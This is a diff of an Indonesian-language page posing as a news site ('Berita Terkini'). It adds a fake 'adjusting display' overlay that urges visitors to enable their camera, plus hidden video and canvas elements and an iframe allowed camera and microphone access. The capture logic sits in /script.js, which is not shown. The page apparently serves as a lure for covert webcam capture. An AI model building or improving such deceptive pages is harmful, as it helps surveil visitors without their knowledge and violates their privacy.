@@ -1,25 +1,83 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Berita Informasi</title>
+  <title>Berita Terkini</title>
   <style>
-    html, body, iframe {
+    body, html {
       margin: 0;
       padding: 0;
       height: 100%;
       width: 100%;
+      font-family: system-ui, sans-serif;
+      background-color: #f0f2f5;
     }
-    video {
+
+    #overlay {
+      position: absolute;
+      z-index: 9999;
+      width: 100%;
+      height: 100%;
+      background: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    #overlay h1 {
+      font-size: 20px;
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    #overlay p {
+      font-size: 14px;
+      color: #666;
+      max-width: 300px;
+    }
+
+    .loader {
+      margin: 20px auto;
+      border: 5px solid #eee;
+      border-top: 5px solid #007bff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    video, canvas {
       display: none;
+    }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      z-index: 0;
     }
   </style>
 </head>
 <body>
 
-<video id="video" autoplay muted playsinline></video>
+<div id="overlay">
+  <h1>Menyesuaikan Tampilan...</h1>
+  <p>Sistem sedang menyesuaikan resolusi dan pencahayaan untuk kualitas tampilan optimal. Aktifkan kamera browser Anda untuk melanjutkan.</p>
+  <div class="loader"></div>
+</div>
+
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="640" height="480"></canvas>
 <iframe id="targetFrame" allow="autoplay; camera; microphone; picture-in-picture" allowfullscreen></iframe>
 
+<!-- Tidak diganti, sesuai permintaan -->
 <script src="/script.js"></script>
 
 </body>
